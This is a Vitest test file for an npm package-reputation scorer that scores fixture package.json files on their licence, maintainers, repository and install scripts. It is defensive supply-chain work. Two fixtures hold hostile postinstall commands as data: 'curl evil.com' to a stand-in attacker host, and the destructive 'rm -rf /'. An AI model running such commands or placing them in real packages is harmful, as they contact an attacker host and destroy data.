import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { scoreReputationFromNodeModules } from './reputation'

let dir: string

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'safenpm-rep-'))
})

afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true })
})

function writePkg(name: string, pkg: object): void {
  const pkgDir = path.join(dir, ...name.split('/'))
  fs.mkdirSync(pkgDir, { recursive: true })
  fs.writeFileSync(path.join(pkgDir, 'package.json'), JSON.stringify(pkg, null, 2))
}

describe('scoreReputationFromNodeModules', () => {
  it('returns 100 / empty tiers on a non-existent node_modules', () => {
    const r = scoreReputationFromNodeModules(path.join(dir, 'missing'))
    expect(r.totalPackages).toBe(0)
    expect(r.overallScore).toBe(100)
  })

  it('classifies a well-formed package as trusted or established', () => {
    writePkg('good-lib', {
      name: 'good-lib',
      version: '2.5.0',
      description: 'A well-described, mature library.',
      license: 'MIT',
      repository: 'https://github.com/example/good-lib',
      maintainers: [{ name: 'a' }, { name: 'b' }, { name: 'c' }],
    })
    const r = scoreReputationFromNodeModules(dir)
    expect(r.totalPackages).toBe(1)
    const pkg = r.riskiest[0]!
    expect(['trusted', 'established']).toContain(pkg.tier)
    expect(pkg.score).toBeGreaterThanOrEqual(60)
  })

  it('penalises a package with install scripts and a sole maintainer', () => {
    writePkg('sketchy', {
      name: 'sketchy',
      version: '0.0.1',
      scripts: { postinstall: 'curl evil.com' },
      maintainers: [{ name: 'alone' }],
      // no license, no description, no repo
    })
    const r = scoreReputationFromNodeModules(dir)
    const pkg = r.riskiest[0]!
    expect(pkg.tier === 'risky' || pkg.tier === 'unknown' || pkg.tier === 'emerging').toBe(true)
    expect(pkg.score).toBeLessThan(60)
    const factors = pkg.factors.map((f) => f.factor)
    expect(factors).toContain('install-scripts')
  })

  it('discovers scoped packages under node_modules/@scope/pkg', () => {
    writePkg('@acme/widget', {
      name: '@acme/widget',
      version: '1.0.0',
      description: 'Widget under acme scope.',
      license: 'MIT',
    })
    const r = scoreReputationFromNodeModules(dir)
    expect(r.totalPackages).toBe(1)
    expect(r.riskiest[0]?.name).toBe('@acme/widget')
  })

  it('skips dotfile directories like .bin and .cache', () => {
    fs.mkdirSync(path.join(dir, '.bin'), { recursive: true })
    fs.writeFileSync(path.join(dir, '.bin', 'something'), '#!/bin/sh\n')
    writePkg('real', { name: 'real', version: '1.0.0' })
    const r = scoreReputationFromNodeModules(dir)
    expect(r.totalPackages).toBe(1)
    expect(r.riskiest[0]?.name).toBe('real')
  })

  it('ignores directories that have no package.json', () => {
    fs.mkdirSync(path.join(dir, 'no-meta'), { recursive: true })
    const r = scoreReputationFromNodeModules(dir)
    expect(r.totalPackages).toBe(0)
  })

  it('aggregates a tier histogram across many packages', () => {
    writePkg('a', { name: 'a', version: '1.0.0', license: 'MIT', maintainers: [{}, {}, {}], description: 'aaaaaaaaaaaa' })
    writePkg('b', { name: 'b', version: '0.0.1', scripts: { install: 'x' } })
    writePkg('c', { name: 'c', version: '1.0.0' })
    const r = scoreReputationFromNodeModules(dir)
    expect(r.totalPackages).toBe(3)
    const tierTotal = Object.values(r.tiers).reduce((s, n) => s + n, 0)
    expect(tierTotal).toBe(3)
  })

  it('weighs the bottom 10% in the overall score (worse than the average)', () => {
    // 10 strong + 1 awful → overall should land below averageScore.
    for (let i = 0; i < 10; i++) {
      writePkg(`strong-${i}`, {
        name: `strong-${i}`, version: '2.0.0',
        license: 'MIT', description: 'A trustworthy library.',
        repository: 'https://github.com/x/y',
        maintainers: [{}, {}, {}],
      })
    }
    writePkg('awful', {
      name: 'awful', version: '0.0.1',
      scripts: { postinstall: 'rm -rf /' },
    })
    const r = scoreReputationFromNodeModules(dir)
    expect(r.overallScore).toBeLessThanOrEqual(r.averageScore)
  })
})
